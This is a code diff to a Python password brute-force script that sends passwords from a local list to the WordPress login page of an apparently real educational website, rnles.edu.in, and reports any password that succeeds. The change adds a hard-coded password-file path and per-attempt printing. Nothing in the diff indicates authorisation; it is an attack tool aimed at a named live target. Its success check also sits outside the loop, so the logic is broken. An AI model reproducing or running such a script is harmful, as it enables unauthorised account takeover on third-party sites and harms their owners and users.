@@ -28,7 +28,7 @@ def Brute():
     print()
     print("[*] Started Brute Force Attack On Target")
     print("[+] Attacking")
-    passwords = [x.strip() for x in open('passwords.txt', 'r').readlines() if x]
+    passwords = [x.strip() for x in open('C:\\Users\\hp\\passwords.txt', 'r').readlines() if x]
     
     for password in passwords:
         data = {
@@ -39,10 +39,14 @@ def Brute():
           'testcookie': '1'
         }
 
+        print("[*] Trying Password: " + password)
+
         response = requests.post('https://rnles.edu.in/wp-login.php', headers=headers, cookies=cookies, data=data)
         
     if "The password you entered for the username" not in response.text:
+        print()
         print("[+] Password Found: " + password)
+        pwd = "1"
 
 try:
     thread = threading.Thread(target=Brute)
@@ -51,3 +55,5 @@ try:
 except KeyboardInterrupt:
     print("[-] Aborted")
     sys.exit()
+
+
